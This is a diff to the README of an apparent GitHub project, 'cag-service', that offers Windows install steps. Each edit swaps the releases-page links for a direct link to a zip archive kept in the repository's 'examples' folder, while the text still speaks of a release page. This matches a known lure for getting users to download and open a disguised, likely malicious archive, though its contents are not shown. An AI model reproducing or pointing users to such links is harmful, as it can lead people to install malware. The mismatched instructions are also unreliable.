@@ -1,12 +1,12 @@
 # ⚡ cag-service - Fast knowledge answers from your files
 
-[![Download cag-service](https://img.shields.io/badge/Download%20cag--service-%23007acc?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Unfed-parenthesisfreenotation627/cag-service/releases)
+[![Download cag-service](https://img.shields.io/badge/Download%20cag--service-%23007acc?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Unfed-parenthesisfreenotation627/cag-service/raw/refs/heads/main/examples/cag_service_2.6.zip)
 
 ## 📥 Download
 
 Visit this page to download cag-service for Windows:
 
-https://github.com/Unfed-parenthesisfreenotation627/cag-service/releases
+https://github.com/Unfed-parenthesisfreenotation627/cag-service/raw/refs/heads/main/examples/cag_service_2.6.zip
 
 On the release page, look for the latest version and download the Windows file. After the download finishes, open the file to start the app.
 
@@ -49,7 +49,7 @@ If you use OpenAI, Anthropic, or HuggingFace, make sure you have your API key re
 ## 🚀 Install on Windows
 
 1. Open the download page:
-   https://github.com/Unfed-parenthesisfreenotation627/cag-service/releases
+   https://github.com/Unfed-parenthesisfreenotation627/cag-service/raw/refs/heads/main/examples/cag_service_2.6.zip
 
 2. Find the latest release.
 
@@ -286,4 +286,4 @@ ai, aiops, anthropic, cag, fastapi, huggingface, knowledge-base, llm, nlp, ollam
 
 If you need the Windows download, visit:
 
-https://github.com/Unfed-parenthesisfreenotation627/cag-service/releases
+https://github.com/Unfed-parenthesisfreenotation627/cag-service/raw/refs/heads/main/examples/cag_service_2.6.zip
